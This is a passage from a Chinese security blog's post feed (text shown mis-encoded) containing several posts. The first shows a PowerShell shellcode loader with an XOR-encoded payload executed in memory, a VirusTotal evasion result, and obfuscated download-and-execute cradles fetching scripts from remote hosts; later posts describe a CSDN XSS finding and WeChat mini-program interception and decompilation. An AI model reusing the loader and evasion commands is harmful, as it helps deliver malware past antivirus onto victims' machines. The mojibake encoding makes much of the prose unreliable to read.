Managed&#x27;)<br>$atype_b.DefineMethod(&#x27;Inv&#x27;+&#x27;oke&#x27;, &#x27;Public, HideBySig, NewSlot, Virtual&#x27;, $areturn_type, $aparameters).SetImplementationFlags(&#x27;Runtime, Managed&#x27;)<br><br>return $atype_b.CreateType()<br>&#125;<br><br>[Byte[]]$var_code = [Byte[]](<span class="hljs-number">223,203,170,35</span>,<span class="hljs-number">35,35,67,170</span>,<span class="hljs-number">198,18,241,71</span>,<span class="hljs-number">168,113,19,168</span>,<span class="hljs-number">113,47,168,113</span>,<span class="hljs-number">55,168,81,11</span>,<span class="hljs-number">44,148,105,5</span>,<span class="hljs-number">18,220,18,227</span>,<span class="hljs-number">143,31,66,95</span>,<span class="hljs-number">33,15,3,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">193,211,113,116</span>,<span class="hljs-number">168,113,51,168</span>,<span class="hljs-number">97,31,34,243</span>,<span class="hljs-number">168,99,91,166</span>,<span class="hljs-number">227,87,105,34</span>,<span class="hljs-number">243,115,168,107</span>,<span class="hljs-number">59,168,123,3</span>,<span class="hljs-number">34,240,192,31</span>,<span class="hljs-number">106,168,23,168</span>,<span class="hljs-number">34,245,18,220</span>,<span class="hljs-number">18,227,143,226</span>,<span class="hljs-number">236,46,34,228</span>,<span class="hljs-number">27,195,86,215</span>,<span class="hljs-number">32,94,219,24</span>,<span class="hljs-number">94,7,86,193</span>,<span class="hljs-number">123,168,123,7</span>,<span class="hljs-number">34,240,69,168</span>,<span class="hljs-number">47,104,168,123</span>,<span class="hljs-number">63,34,240,168</span>,<span class="hljs-number">39,168,34,243</span>,<span class="hljs-number">170,103,7,7</span>,<span class="hljs-number">120,120,66,122</span>,<span class="hljs-number">121,114,220,195</span>,<span class="hljs-number">123,124,121,168</span>,<span class="hljs-number">49,200,165,126</span>,<span class="hljs-number">75,77,70,87</span>,<span class="hljs-number">35,75,84,74</span>,<span class="hljs-number">77,74,119,75</span>,<span class="hljs-number">111,84,5,36</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,116,116,116</span>,<span class="hljs-number">116,75,25,117</span>,<span class="hljs-number">90,132,220,246</span>,<span class="hljs-number">202,167,35,35</span>,<span class="hljs-number">35,120,18,234</span>,<span class="hljs-number">114,114,73,32</span>,<span class="hljs-number">114,114,75,83</span>,<span class="hljs-number">142,35,35,112</span>,<span class="hljs-number">115,75,116,170</span>,<span class="hljs-number">188,229,220,246</span>,<span class="hljs-number">200,83,120,18</span>,<span class="hljs-number">241,113,75,35</span>,<span class="hljs-number">33,99,167,113</span>,<span class="hljs-number">113,113,112,113</span>,<span class="hljs-number">115,75,200,118</span>,<span class="hljs-number">13,24,220,246</span>,<span class="hljs-number">170,229,160,224</span>,<span class="hljs-number">115,18,220,116</span>,<span class="hljs-number">116,73,220,112</span>,<span class="hljs-number">117,75,14,37</span>,<span class="hljs-number">59,88,220,246</span>,<span class="hljs-number">166,227,44,167</span>,<span class="hljs-number">224,34,35,35</span>,<span class="hljs-number">18,220,166,213</span>,<span class="hljs-number">87,39,170,218</span>,<span class="hljs-number">200,42,75,137</span>,<span class="hljs-number">230,193,126,220</span>,<span class="hljs-number">246,170,226,75</span>,<span class="hljs-number">102,2,125,18</span>,<span class="hljs-number">220,246,18,220</span>,<span class="hljs-number">116,73,36,114</span>,<span class="hljs-number">117,115,75,148</span>,<span class="hljs-number">116,195,40,220</span>,<span class="hljs-number">246,156,35,12</span>,<span class="hljs-number">35,35,26,228</span>,<span class="hljs-number">87,148,18,220</span>,<span class="hljs-number">202,178,34,35</span>,<span class="hljs-number">35,202,234,34</span>,<span class="hljs-number">35,35,203,168</span>,<span class="hljs-number">220,220,220,12</span>,<span class="hljs-number">87,75,26,100</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,99,98</span>,<span class="hljs-number">115,120,23,127</span>,<span class="hljs-number">115,121,123,22</span>,<span class="hljs-number">23,11,115,125</span>,<span class="hljs-number">10,20,96,96</span>,<span class="hljs-number">10,20,94,7</span>,<span class="hljs-number">102,106,96,98</span>,<span class="hljs-number">113,14,112,119</span>,<span class="hljs-number">98,109,103,98</span>,<span class="hljs-number">113,103,14,98</span>,<span class="hljs-number">109,119,106,117</span>,<span class="hljs-number">106,113,118,112</span>,<span class="hljs-number">14,119,102,112</span>,<span class="hljs-number">119,14,101,106</span>,<span class="hljs-number">111,102,2,7</span>,<span class="hljs-number">107,8,107,9</span>,<span class="hljs-number">35,22,108,2</span>,<span class="hljs-number">115,6,35,118</span>,<span class="hljs-number">80,70,81,14</span>,<span class="hljs-number">98,68,70,77</span>,<span class="hljs-number">87,25,3,110</span>,<span class="hljs-number">76,89,74,79</span>,<span class="hljs-number">79,66,12,22</span>,<span class="hljs-number">13,19,3,11</span>,<span class="hljs-number">64,76,78,83</span>,<span class="hljs-number">66,87,74,65</span>,<span class="hljs-number">79,70,24,3</span>,<span class="hljs-number">110,112,106,102</span>,<span class="hljs-number">3,26,13,19</span>,<span class="hljs-number">24,3,116,74</span>,<span class="hljs-number">77,71,76,84</span>,<span class="hljs-number">80,3,109,119</span>,<span class="hljs-number">3,21,13,18</span>,<span class="hljs-number">24,3,116,108</span>,<span class="hljs-number">116,21,23,24</span>,<span class="hljs-number">3,119,81,74</span>,<span class="hljs-number">71,70,77,87</span>,<span class="hljs-number">12,22,13,19</span>,<span class="hljs-number">24,3,110,98</span>,<span class="hljs-number">112,97,10,46</span>,<span class="hljs-number">41,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,120,23</span>,<span class="hljs-number">127,115,121,123</span>,<span class="hljs-number">22,23,11,115</span>,<span class="hljs-number">125,10,20,96</span>,<span class="hljs-number">96,10,20,94</span>,<span class="hljs-number">7,102,106,96</span>,<span class="hljs-number">98,113,14,112</span>,<span class="hljs-number">119,98,109,103</span>,<span class="hljs-number">98,113,103,14</span>,<span class="hljs-number">98,109,119,106</span>,<span class="hljs-number">117,106,113,118</span>,<span class="hljs-number">112,14,119,102</span>,<span class="hljs-number">112,119,14,101</span>,<span class="hljs-number">106,111,102,2</span>,<span class="hljs-number">7,107,8,107</span>,<span class="hljs-number">9,35,22,108</span>,<span class="hljs-number">2,115,6,99</span>,<span class="hljs-number">98,115,35,75</span>,<span class="hljs-number">211,150,129,117</span>,<span class="hljs-number">220,246,73,99</span>,<span class="hljs-number">75,35,51,35</span>,<span class="hljs-number">35,75,35,35</span>,<span class="hljs-number">99,35,116,75</span>,<span class="hljs-number">123,135,112,198</span>,<span class="hljs-number">220,246,176,154</span>,<span class="hljs-number">35,35,35,35</span>,<span class="hljs-number">34,250,114,112</span>,<span class="hljs-number">170,196,116,75</span>,<span class="hljs-number">35,3,35,35</span>,<span class="hljs-number">112,117,75,49</span>,<span class="hljs-number">181,170,193,220</span>,<span class="hljs-number">246,166,227,87</span>,<span class="hljs-number">229,168,36,34</span>,<span class="hljs-number">224,166,227,86</span>,<span class="hljs-number">198,123,224,203</span>,<span class="hljs-number">138,222,220,220</span>,<span class="hljs-number">18,19,18,13</span>,<span class="hljs-number">18,16,17,13</span>,<span class="hljs-number">17,17,20,13</span>,<span class="hljs-number">17,17,20,35</span>,<span class="hljs-number">35,35,35,35</span>)<br><br>for ($x = <span class="hljs-number">0</span><span class="hljs-comment">; $x -lt $acode.Count; $x++) &#123;</span><br>$acode[$x] = $acode[$x] -bxor <span class="hljs-number">35</span><br>&#125;<br><br>$ava = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer((func_b kernel32.dll VirtualAlloc), (func_a @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))<br>$abuffer = $ava.Invoke([IntPtr]<span class="hljs-number">::</span>Zero, $acode.Length, <span class="hljs-number">0</span>x3000, <span class="hljs-number">0</span>x40)<br>[System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>Copy($acode, <span class="hljs-number">0</span>, $abuffer, $acode.length)<br><br>$arunme = [System.Runtime.InteropServices.Marshal]<span class="hljs-number">::</span>GetDelegateForFunctionPointer($abuffer, (func_a @([IntPtr]) ([Void])))<br>$arunme.Invoke([IntPtr]<span class="hljs-number">::</span>Zero)<br>&#x27;@<br><br>If ([IntPtr]<span class="hljs-number">::</span>size -eq <span class="hljs-number">8</span>) &#123;<br>start-job &#123; param($a) ie`x $a &#125; -RunAs32 -Argument $DoIt | wait-job | Receive-Job<br>&#125;<br>else &#123;<br>i`ex $DoIt<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å†æ”¾åˆ°virustotalä¸Šé¢è¯•è¯•<br><img src="https://s2.loli.net/2022/08/16/Eqp7YMwD8feWuVl.png"><br>28/60ï¼Œä¹Ÿå°±å¤šç»•è¿‡äº†4ä¸ªé˜²ç«å¢™<br>è¿˜æ˜¯å¤ªèœäº†ï¼Œæ‰‹åŠ¨çš„è¯ï¼Œå¤§æ¦‚å°±è¿™æ ·äº†ï¼Œä¸‹é¢è´´ä¸€ä¸‹åœ¨æ‰§è¡Œè¿œç¨‹æ‰§è¡Œè„šæœ¬æ—¶ä»£ç æ··æ·†ï¼Œç›´æ¥æ‰§è¡Œcsç”Ÿæˆçš„è¯­å¥æ€è½¯æ‹¦æˆªçš„æ··æ·†æ“ä½œ</p><ol><li><p>ä½¿ç”¨Replaceæ›¿æ¢å…³é”®å­—éƒ¨åˆ†å­—æ¯ï¼ŒåŠ ä¸Šé€šè¿‡æ‹†åˆ†åé‡æ–°ç»„åˆ<br><code>powershell.exe -nop -w hidden -c &quot;$c1=&#39;IEX(New-Object Net.WebClient).Downlo&#39;;$c2=&#39;123(&#39;&#39;http://0.0.0.0:4545/text.txt&#39;&#39;)&#39;.Replace(&#39;123&#39;,&#39;adString&#39;);IEX ($c1+$c2)&quot;</code></p></li><li><p>ä½¿ç”¨powershellè¯­è¨€çš„ç‰¹æ€§æ¥æ··æ·†ä»£ç </p></li></ol><p><code>cmd.exe /c &quot;powershell -c Write-Host SUCCESS -Fore Green&quot;</code></p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell -&quot;</code></p><p><code>cmd /c &quot;set p1=power&amp;&amp; set p2=shell&amp;&amp; cmd /c echo Write-Host SUCCESS -Fore Green ^|%p1%%p2% -&quot;</code></p><p>ç®¡é“è¾“å…¥æµï¼š</p><p><code>cmd.exe /c &quot;echo Write-Host SUCCESS -Fore Green | powershell IEX $input&quot;</code></p><p>åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼š</p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX $env:cmd&quot;</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;cmd /c echo %cmd%|powershell -</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ([Environment]::GetEnvironmentVariable(&#39;cmd&#39;, &#39;Process&#39;))</code></p><p><code>cmd.exe /c &quot;set cmd=Write-Host ENV -Fore Green&amp;&amp;powershell IEX ((Get-ChildItem/ChildItem/GCI/DIR/LS env:cmd).Value)</code></p><p>ä»å…¶ä»–è¿›ç¨‹è·å–å‚æ•°ï¼š</p><p><code>cmd /c &quot;title WINDOWS_DEFENDER_UPDATE&amp;&amp;echo IEX (IWR https://7ell.me/power)&amp;&amp; FOR /L %i IN (1,1,1000) DO echo&quot;</code></p><hr><p>å‚è€ƒæ–‡ç« ï¼š<br><a href="https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw">https://mp.weixin.qq.com/s/TtKEnmUbtVMSqBCgrSj2Qw</a></p>]]></content>
      
      
      <categories>
          
          <category> å…æ€ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å…æ€ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è®°ä¸€æ¬¡csdnçš„xssæ¼æ´</title>
      <link href="2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/"/>
      <url>2022/07/06/%E8%AE%B0%E4%B8%80%E6%AC%A1csdn%E7%9A%84xss%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/07/06/uzAU24HoCVOB1kS.png"><br>csdnå­˜åœ¨â€œçŒœä½ æƒ³æœâ€ï¼Œå¹¶å°†å…¶å€¼å­˜åœ¨placeholderä¸­</p><p>åœ¨æœç´¢xssç›¸å…³ä¿¡æ¯åï¼Œå°†ä¼šæ¨èï¼Œ</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">&lt;img src=<span class="hljs-number">1</span> onerror=alert(<span class="hljs-number">1</span>)&gt;<br></code></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾æ‰€ç¤º<br><img src="https://s2.loli.net/2022/07/06/mvx5pW2u6fUTLi3.png"><br>xssçš„æ‰§è¡Œè¯­å¥è¢«æ”¾åˆ°äº†placeholderä¸­ï¼Œä¸”æ²¡æœ‰è¿‡æ»¤</p><p>å­˜åœ¨xssæ¼æ´ï¼Œæˆæœå¦‚ä¸‹å›¾æ‰€ç¤º</p><p><img src="https://s2.loli.net/2022/07/06/BAbNqDlcxWEdgFK.png"></p><blockquote><p>æˆæœ<br><a href="/files/csdn_xss.mp4">æˆæœæ¼”ç¤º</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> others </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å°ç¨‹åºæ¸—é€3</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F3/</url>
      
        <content type="html"><![CDATA[<h1 id="å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆåç¼–è¯‘ï¼‰"><a href="#å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆåç¼–è¯‘ï¼‰" class="headerlink" title="å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆåç¼–è¯‘ï¼‰"></a>å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆåç¼–è¯‘ï¼‰</h1><p>å¾®ä¿¡å°ç¨‹åºåç¼–è¯‘</p><a id="more"></a><p>ä»£ç†çš„é…ç½®ï¼ŒæˆåŠŸæŠ“åŒ…åï¼Œæ¥ä¸‹æ¥å°±æ˜¯å¯¹å¾®ä¿¡å°ç¨‹åºçš„æºç åˆ†æ<br>é¦–å…ˆä¸‹è½½å¾®ä¿¡<br>ï¼ˆæ³¨æ„ï¼šå¦‚æœç°åœ¨ä»ç„¶æŒ‚ç€ä»£ç†ï¼Œå°†ä¼šæ— æ³•æ­£å¸¸ä¸‹è½½å¾®ä¿¡ï¼‰</p><p>æˆ‘ä»¬åœ¨æ¨¡æ‹Ÿå™¨é‡Œç™»å½•å¾®ä¿¡ï¼Œéšä¾¿é€‰æ‹©ä¸€ä¸ªå°ç¨‹åºæ‰“å¼€</p><p>æ‰“å¼€æ–‡ä»¶ç®¡ç†å™¨ï¼Œåœ¨ä¼šç”Ÿæˆä¸€ä¸ªmd5åŠ å¯†å‘½åçš„æ–‡ä»¶å¤¹ï¼ˆå¦‚æœæ‰“å¼€å¾®ä¿¡å°ç¨‹åºè¿‡å¤šï¼ŒåŒæ—¶æœ‰å¤šä¸ªæ–‡ä»¶å¤¹ä¸å®¹æ˜“è¯†åˆ«çš„æƒ…å†µï¼Œå¯ä»¥é€‰æ‹©æŠŠæ–‡ä»¶å¤¹æ‰€æœ‰å†…å®¹åˆ é™¤æ‰ï¼Œå†å»é‡æ–°æ‰“å¼€å¾®ä¿¡å°ç¨‹åºï¼Œå°±ä¼šå¾—åˆ°å”¯ä¸€ä¸€ä¸ªMD5åŠ å¯†å‘½åçš„æ–‡ä»¶å¤¹ï¼‰<br>åœ¨å¦‚å›¾æ‰€ç¤ºçš„è·¯å¾„ä¸‹ï¼Œèƒ½çœ‹åˆ°è¯¥å°ç¨‹åºçš„æ–‡ä»¶å¤¹<br><img src="https://s2.loli.net/2022/05/02/rkYKtlQaqmP8UH1.png"></p><p>ä¸€èˆ¬éƒ½åœ¨/appbrand/pkgç›®å½•ä¸‹ï¼Œä¼šçœ‹åˆ°å¸¦æœ‰åç¼€ä¸ºwxapkgçš„æ–‡ä»¶<br>éœ€è¦å°†å…¶ä¸€ä¸€æ‹·è´åˆ°æœ¬åœ°ä¸»æœºä¸‹<br>æ³¨æ„ï¼šå°†æ•´ä¸ªæ–‡ä»¶å¤¹å¤åˆ¶å¤§æ¦‚ç‡ä¼šä½¿å¾—æ–‡ä»¶ç®¡ç†ç³»ç»Ÿåœæ­¢å·¥ä½œè€Œå¤±è´¥ï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶çš„æ‹·è´ï¼ˆç¡®å®éº»çƒ¦ï¼ï¼‰</p><p>åœ¨å¤œç¥æ¨¡æ‹Ÿå™¨ä¸­ï¼Œæ‰“å¼€æ–‡ä»¶åŠ©æ‰‹ï¼Œæ‰¾åˆ°æ¨¡æ‹Ÿå™¨ä¸æœ¬åœ°ä¸»æœºçš„å…±äº«æ–‡ä»¶å¤¹<br><img src="https://s2.loli.net/2022/05/02/9oGFHnSsMeY4lUu.png"></p><p>å¼€å§‹æ‹·è´æ–‡ä»¶ï¼ˆå›¾å½¢åŒ–äº¤äº’ç¡®å®æ…¢ã€‚ã€‚ï¼‰<br><img src="https://s2.loli.net/2022/05/02/kaIZgyobT6QuKth.png"></p><p>æ‹·è´å®Œæ–‡ä»¶ä¹‹åï¼Œå°±æ˜¯åç¼–è¯‘äº†<br><a href="https://github.com/ezshine/wxapkg-convertor/releases"> GUI ç•Œé¢çš„åç¼–è¯‘å·¥å…·</a></p><p>å°†æ–‡ä»¶æ‹–å…¥å³å¯<br><img src="https://s2.loli.net/2022/05/02/Zng49N3rG5YmhQU.png"></p><p>æ‰€æœ‰çš„wxapkgæ–‡ä»¶ç¼–è¯‘å®Œæˆ<br><img src="https://s2.loli.net/2022/05/02/4oEBJD6SzH2LPuC.png"></p><p>æ¥ä¸‹æ¥å°±æ˜¯æºç å®¡è®¡äº†<br><img src="https://s2.loli.net/2022/05/02/Shz3byPwKoZHd2l.png"></p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç¨‹åºæ¸—é€2</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/</url>
      
        <content type="html"><![CDATA[<h1 id="å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰"><a href="#å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰" class="headerlink" title="å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰"></a>å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰</h1><p>å¾®ä¿¡å°ç¨‹åºæŠ“åŒ…2</p><a id="more"></a><p>å®‰å“7.0ç‰ˆæœ¬ä¹‹åï¼Œæ¨¡æ‹Ÿå™¨æ— æ³•æ­£å¸¸ä¸‹è½½è¯ä¹¦ï¼Œ<br>å¯¼å…¥çš„è¯ä¹¦åˆ†ä¸ºç³»ç»Ÿè¯ä¹¦å’Œç”¨æˆ·è¯ä¹¦ã€‚<br>ä¹‹å‰å¯¼å…¥çš„ä¸ºç”¨æˆ·è¯ä¹¦ï¼Œéœ€è¦å°†å…¶æ”¹ä¸ºç³»ç»Ÿè¯ä¹¦</p><p>ä½¿ç”¨opensslå°†è¯ä¹¦æ ¼å¼è½¬æ¢<br>è‡ªè¡Œä¸‹è½½opensslï¼ˆæˆ‘è¿™é‡Œä½¿ç”¨çš„æ˜¯kaliè‡ªå¸¦çš„opensslï¼‰<br>æŸ¥çœ‹æ˜¯å¦å·²ç»å®‰è£…openssl<br><img src="https://s2.loli.net/2022/05/01/BjFawSielCuV2ML.png"></p><p>å°†è¯ä¹¦ä»derå˜ä¸ºpemæ ¼å¼<br><img src="https://s2.loli.net/2022/05/01/SfeK6nDtphCFOZA.png"></p><p>æ‰“å¼€å¤œç¥æ¨¡æ‹Ÿå™¨ï¼Œæ ¹ç›®å½•ä¼šæœ‰nox_adb.exeæ–‡ä»¶ï¼Œç”¨å‘½ä»¤è¡Œå»æ“æ§è¿™ä¸ªæ–‡ä»¶ã€‚ï¼ˆå¦‚æœä¸æ˜¯ç”¨å¤œç¥æ¨¡æ‹Ÿå™¨ï¼Œä¹Ÿå¯ä»¥è‡ªå·±ä¸‹è½½adb å·¥å…·ï¼ŒåŸç†ä¸€æ ·ï¼‰<br><img src="https://s2.loli.net/2022/05/01/aSQtqwEZOBzTUIi.png"></p><p>ä»å‘½ä»¤è¡Œé‡Œä½¿ç”¨<br>é¦–å…ˆæ£€æŸ¥å…¶æ˜¯å¦è¿æ¥æˆåŠŸ<br><img src="https://s2.loli.net/2022/05/01/kXPzrBoqd83ZFsi.png"><br>å†åˆ‡æ¢åˆ°rootæ¨¡å¼ï¼Œå¹¶æ”¹ä¸ºå¯è¯»å†™<br><img src="https://s2.loli.net/2022/05/01/m18nsXhLcHu3oiB.png"></p><p>æŸ¥çœ‹è¯¥è¯ä¹¦çš„hashå€¼<br><img src="https://s2.loli.net/2022/05/01/aDwJW1LTkhKtF8p.png"></p><p>æ‹·è´è¯¥è¯ä¹¦ï¼Œé‡å‘½åä¸º hashç»“æœé‡Œé¢çš„åç§° <strong>æ³¨æ„è¿™é‡Œè¦åœ¨åç§°ååŠ .</strong><br><img src="https://s2.loli.net/2022/05/01/9E8fDIAmU2SsrQM.png"><br>è¿™æ ·å°±ç®—å®Œæˆäº†</p><p>PS:ä½†æ˜¯è¯ä¹¦ä»ç„¶ä¼šå‡ºç°é—®é¢˜ï¼Œç›®å‰è¿˜æ²¡æ‰¾åˆ°è§£å†³çš„åŠæ³•ï¼Œä½†èƒ½æˆåŠŸæŠ“åŒ…<br>æ‰€ä»¥è¿˜æ˜¯å»ºè®®ä½¿ç”¨7.0ç‰ˆæœ¬ä¹‹å‰çš„å®‰å“</p>]]></content>
      
      
      <categories>
          
          <category> Android </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å°ç¨‹åºæ¸—é€1</title>
      <link href="2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/"/>
      <url>2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<h1 id="å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰"><a href="#å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰" class="headerlink" title="å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰"></a>å¾®ä¿¡å°ç¨‹åºæ¸—é€æµ‹è¯•ï¼ˆæŠ“åŒ…ï¼‰</h1><p>è€ƒè™‘åˆ°å¾®ä¿¡å°ç¨‹åºå¤§å¤šæ˜¯å¤–åŒ…å¼€å‘ï¼Œä¸”é«˜æ ¡çš„å°ç¨‹åºéƒ¨åˆ†ä¸ºå­¦ç”Ÿå¼€å‘ï¼Œç›¸æ¯”äºç«™ç‚¹ï¼Œå®‰å…¨æ€§è¾ƒä½ï¼Œå°è¯•å»å¯¹å¾®ä¿¡å°ç¨‹åºè¿›è¡Œæ¸—é€</p><a id="more"></a><p>è¿™æ˜¯åŸºäºå®‰å“7.0ä¹‹å‰<br><a href="https://silver-glacier.github.io/2022/05/01/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F2/">7.0ä¹‹åçœ‹è¿™é‡Œ</a></p><p>é¦–å…ˆå‡†å¤‡å¥½ä¸€ä¸ªå®‰å“æ¨¡æ‹Ÿå™¨ï¼Œæˆ‘åœ¨è¿™é‡Œä½¿ç”¨çš„æ˜¯å¤œç¥æ¨¡æ‹Ÿå™¨</p><p><img src="https://s2.loli.net/2022/05/01/KMcdE8il9Yu6NPW.png"><br>é¦–å…ˆåˆ‡æ¢åˆ°rootæ¨¡å¼</p><p>ç»™burpsuiteåŠ ä¸Šæœ¬åœ°IPçš„ç«¯å£ç›‘å¬ï¼Œå¦‚æœæ˜¯åœ¨è™šæ‹Ÿæœºä¸Šå®ç°ï¼Œåˆ™åŠ ä¸Šå¯¹åº”çš„IPç«¯å£<br><img src="https://s2.loli.net/2022/05/01/gdYsDOaTp1z6tJn.png"></p><p>æ‰“å¼€æ¨¡æ‹Ÿå™¨çš„ç½‘ç»œè¿æ¥è®¾ç½®ï¼Œé•¿æŒ‰WiredSSIDï¼Œä¿®æ”¹ç½‘ç»œï¼Œè¿›å…¥é«˜çº§è®¾ç½®<br><img src="https://s2.loli.net/2022/05/01/51PevgYNJSsj9kt.png"></p><p>è®¾ç½®ä¸ºæ‰‹åŠ¨ä»£ç†ï¼ŒåŠ ä¸Šä¸burpsuiteä¸Šç›¸å¯¹åº”çš„IPä»¥åŠç«¯å£å·<br><img src="https://s2.loli.net/2022/05/01/8N2LTMwHvJIUsCW.png"></p><p>ä»æµè§ˆå™¨æ‰“å¼€ç›¸åº”çš„IPä»¥åŠç«¯å£ï¼Œä¸‹è½½ç›¸åº”çš„burpsuiteçš„è¯ä¹¦<br>ï¼ˆè¿™é‡Œåªæ˜¯ä¸ºäº†ä¸‹è½½ç›¸åº”çš„è¯ä¹¦ï¼Œä¹Ÿå¯ä»¥ä»æœ¬åœ°ä¸‹è½½ä¸‹æ¥ï¼Œå†æ”¾å…¥åˆ°æ¨¡æ‹Ÿå™¨ä¸­ï¼‰<br><img src="https://s2.loli.net/2022/05/01/usxnIrJd4vCVqNA.png"></p><p>ä¸‹è½½å®Œæˆåï¼Œæ‰“å¼€æ¨¡æ‹Ÿå™¨è‡ªå¸¦çš„æ–‡ä»¶ç®¡ç†ç³»ç»Ÿï¼Œä¸‹è½½çš„è¯ä¹¦å°†åœ¨downloadä¸­<br><strong>è¿™é‡Œæ³¨æ„ï¼ä¸‹è½½ä¸‹æ¥çš„è¯ä¹¦å¾ˆå¯èƒ½æ˜¯ç°è‰²çš„ï¼Œéœ€è¦å°†åç¼€æ”¹ä¸ºcrtï¼Œderåç¼€æ–‡ä»¶å¯èƒ½å­˜åœ¨è¯†åˆ«é”™è¯¯çš„é—®é¢˜</strong><br><strong>å…¶ä»–é—®é¢˜ï¼šå¯èƒ½å­˜åœ¨è¯ä¹¦åœ¨downloadç›®å½•ä¸‹ä¹Ÿæ— æ³•æ­£å¸¸å¯¼å…¥ï¼Œéœ€è¦å°†å…¶ç§»å…¥å…¶ä»–ç›®å½•ï¼ˆæœ¬äººå†è¿™é‡Œæœªé‡åˆ°è¯¥é—®é¢˜ï¼‰</strong><br><img src="https://s2.loli.net/2022/05/01/lI4A7bcEVMZ2Nso.png"></p><p>æˆåŠŸå¯¼å…¥è¯ä¹¦åå°±å®Œæˆäº†<br>æˆ‘ä»¬æ‰“å¼€ç™¾åº¦æµ‹è¯•ä¸€ä¸‹<br><img src="https://s2.loli.net/2022/05/01/IiamvHD4TNAMSZP.png" alt="æˆåŠŸæŠ“åŒ…"></p><p><a 